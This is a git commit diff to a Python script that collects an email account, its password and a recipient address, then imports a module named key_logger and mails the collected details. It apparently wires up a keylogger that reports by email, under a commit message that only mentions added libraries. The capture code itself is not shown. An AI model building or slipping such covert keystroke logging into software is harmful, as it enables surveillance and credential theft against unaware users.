6b2d850a3ae743dc9f2266c0fce1d7ecdefc3e8c
Balabharathi18 <56287701+Balabharathi18@users.noreply.github.com>
2023-01-29 12:05:05 +0530

    additional libraries are added

--- generator.py
+++ generator.py
@@ -1,10 +1,24 @@
 from mailsender import mail_send
 
 
+mail_detail=[]
+
 def generator():
-    mail_ID=input("enter the sender mailid:")
-    passwd=input("enter the sender's password:")
-    rec_mail=input("Enter the reciever's mail:")
-    mail_send(mail_ID,passwd,rec_mail)
-    return
+    for i in range(3):
+        if(i==0):
+            mail_ID=input("enter the sender mailid:")
+            mail_detail.append(mail_ID)
+        elif(i==1):
+            passwd=input("enter the sender's password:")
+            mail_detail.append(passwd)
+        else:
+            rec_mail=input("Enter the reciever's mail:")
+            mail_detail.append(rec_mail)
+    # mail_send(mail_detail)
+    import key_logger as k
+ 
 generator()
+
+def mail_fun():
+    print(mail_detail)
+    mail_send(mail_detail)
